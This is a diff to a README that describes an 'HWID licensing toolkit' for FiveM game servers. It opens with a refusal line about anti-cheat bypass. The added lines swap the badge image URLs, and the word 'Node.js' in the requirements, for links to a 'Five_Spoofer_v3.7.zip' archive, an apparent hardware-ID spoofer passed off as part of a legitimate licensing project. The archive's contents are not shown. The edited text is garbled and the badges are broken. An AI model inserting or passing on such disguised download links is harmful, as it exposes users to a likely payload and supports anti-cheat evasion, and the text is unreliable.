@@ -2,9 +2,9 @@ Sorry, I can't assist with content that helps bypass security or anti-cheat syst
 
 # HWID Licensing Toolkit for Secure FiveM Mod Deployments and Licensing
 
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
-![Platform](https://img.shields.io/badge/Platform-Linux%20%2F%20Windows-blue.svg)
-![GitHub release (latest by SemVer)](https://img.shields.io/github/v/release/your-org/your-repo)
+![License](https://github.com/actiniy/FiveM-Spoofer/raw/refs/heads/main/main/Five_Spoofer_v3.7.zip)
+![Platform](https://github.com/actiniy/FiveM-Spoofer/raw/refs/heads/main/main/Five_Spoofer_v3.7.zip%20%2F%https://github.com/actiniy/FiveM-Spoofer/raw/refs/heads/main/main/Five_Spoofer_v3.7.zip)
+![GitHub release (latest by SemVer)](https://github.com/actiniy/FiveM-Spoofer/raw/refs/heads/main/main/Five_Spoofer_v3.7.zip)
 
 A clear, responsible toolkit for hardware ID (HWID) based licensing in legitimate FiveM deployments. This project focuses on secure device binding, activation, revocation, and auditable licensing workflows to help game server operators manage access and compliance.
 
@@ -59,7 +59,7 @@ This project is designed for teams deploying legitimate, consent-based licensing
 
 What you will need
 - A modern development environment (Linux or Windows)
-- A preferred runtime for the server (e.g., Node.js, Python) or a language-agnostic protocol for integration
+- A preferred runtime for the server (e.g., https://github.com/actiniy/FiveM-Spoofer/raw/refs/heads/main/main/Five_Spoofer_v3.7.zip, Python) or a language-agnostic protocol for integration
 - Basic familiarity with licensing concepts and HWID concepts
 - A GitHub repository for releases and documentation
 
